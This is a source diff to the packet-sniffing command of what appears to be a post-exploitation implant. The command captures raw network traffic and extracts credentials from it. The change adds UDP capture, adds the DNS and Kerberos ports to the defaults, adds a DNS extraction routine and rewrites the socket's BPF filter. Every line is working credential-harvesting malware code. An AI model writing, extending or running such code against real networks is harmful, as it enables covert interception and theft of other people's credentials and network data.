@@ -52,7 +52,7 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 	if len(ports) == 0 {
-		ports = []uint16{21, 80, 110, 143, 389, 445, 8080}
+		ports = []uint16{21, 53, 80, 88, 110, 143, 389, 445, 8080}
 	}
 
 	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(sniffHtons(unix.ETH_P_IP)))
@@ -146,7 +146,8 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 			continue
 		}
 		ihl := int(ipData[0]&0x0F) * 4
-		if ihl < 20 || ihl > len(ipData) || ipData[9] != 6 {
+		proto := ipData[9]
+		if ihl < 20 || ihl > len(ipData) || (proto != 6 && proto != 17) {
 			continue
 		}
 		totalLen := int(binary.BigEndian.Uint16(ipData[2:4]))
@@ -158,18 +159,28 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 			SrcIP: net.IP(ipData[12:16]).String(),
 			DstIP: net.IP(ipData[16:20]).String(),
 		}
-		tcpData := ipData[ihl:totalLen]
+		transportData := ipData[ihl:totalLen]
 
-		if len(tcpData) < 20 {
-			continue
+		var payload []byte
+		if proto == 6 { // TCP
+			if len(transportData) < 20 {
+				continue
+			}
+			meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
+			meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
+			dataOff := int(transportData[12]>>4) * 4
+			if dataOff < 20 || dataOff > len(transportData) {
+				continue
+			}
+			payload = transportData[dataOff:]
+		} else { // UDP
+			if len(transportData) < 8 {
+				continue
+			}
+			meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
+			meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
+			payload = transportData[8:]
 		}
-		meta.SrcPort = binary.BigEndian.Uint16(tcpData[0:2])
-		meta.DstPort = binary.BigEndian.Uint16(tcpData[2:4])
-		dataOff := int(tcpData[12]>>4) * 4
-		if dataOff < 20 || dataOff > len(tcpData) {
-			continue
-		}
-		payload := tcpData[dataOff:]
 		if len(payload) == 0 {
 			continue
 		}
@@ -188,6 +199,9 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 		if cred := sniffExtractKerberos(payload, &meta); cred != nil {
 			result.Credentials = append(result.Credentials, cred)
 		}
+		if cred := sniffExtractDNS(payload, &meta); cred != nil {
+			result.Credentials = append(result.Credentials, cred)
+		}
 	}
 
 	result.Duration = time.Since(startTime).Truncate(time.Second).String()
@@ -203,44 +217,17 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 }
 
 func sniffBuildTCPFilter(ports []uint16) []unix.SockFilter {
-	if len(ports) == 0 {
-		return []unix.SockFilter{
-			{Code: 0x28, K: 12},
-			{Code: 0x15, Jt: 0, Jf: 3, K: 0x0800},
-			{Code: 0x30, K: 23},
-			{Code: 0x15, Jt: 0, Jf: 1, K: 6},
-			{Code: 0x06, K: 0xFFFFFFFF},
-			{Code: 0x06, K: 0},
-		}
+	// Accept IPv4 TCP (proto 6) or UDP (proto 17) packets.
+	// Port filtering is done in userspace since BPF port offsets differ for TCP vs UDP.
+	return []unix.SockFilter{
+		{Code: 0x28, K: 12},                              // ldh [12] — EtherType
+		{Code: 0x15, Jt: 0, Jf: 4, K: 0x0800},           // jeq #0x0800, next, drop
+		{Code: 0x30, K: 23},                              // ldb [23] — IP protocol
+		{Code: 0x15, Jt: 1, Jf: 0, K: 6},                // jeq #6 (TCP), accept
+		{Code: 0x15, Jt: 0, Jf: 1, K: 17},               // jeq #17 (UDP), accept, drop
+		{Code: 0x06, K: 0xFFFFFFFF},                      // ret #-1 (accept)
+		{Code: 0x06, K: 0},                               // ret #0 (drop)
 	}
-
-	np := uint8(len(ports))
-	total := 4 + 1 + int(np) + 1 + int(np) + 2
-	acceptOff := total - 1
-
-	var f []unix.SockFilter
-	f = append(f, unix.SockFilter{Code: 0x28, K: 12})
-	f = append(f, unix.SockFilter{Code: 0x15, Jt: 0, Jf: uint8(total - 2 - 1), K: 0x0800})
-	f = append(f, unix.SockFilter{Code: 0x30, K: 23})
-	f = append(f, unix.SockFilter{Code: 0x15, Jt: 0, Jf: uint8(total - 4 - 1), K: 6})
-	f = append(f, unix.SockFilter{Code: 0x28, K: 36})
-
-	for i := uint8(0); i < np; i++ {
-		curIdx := 5 + int(i)
-		f = append(f, unix.SockFilter{Code: 0x15, Jt: uint8(acceptOff - curIdx - 1), Jf: 0, K: uint32(ports[i])})
-	}
-
-	f = append(f, unix.SockFilter{Code: 0x28, K: 34})
-
-	for i := uint8(0); i < np; i++ {
-		curIdx := 5 + int(np) + 1 + int(i)
-		f = append(f, unix.SockFilter{Code: 0x15, Jt: uint8(acceptOff - curIdx - 1), Jf: 0, K: uint32(ports[i])})
-	}
-
-	f = append(f, unix.SockFilter{Code: 0x06, K: 0})
-	f = append(f, unix.SockFilter{Code: 0x06, K: 0xFFFFFFFF})
-
-	return f
 }
 
 func sniffAttachBPF(fd int, filter []unix.SockFilter) error {
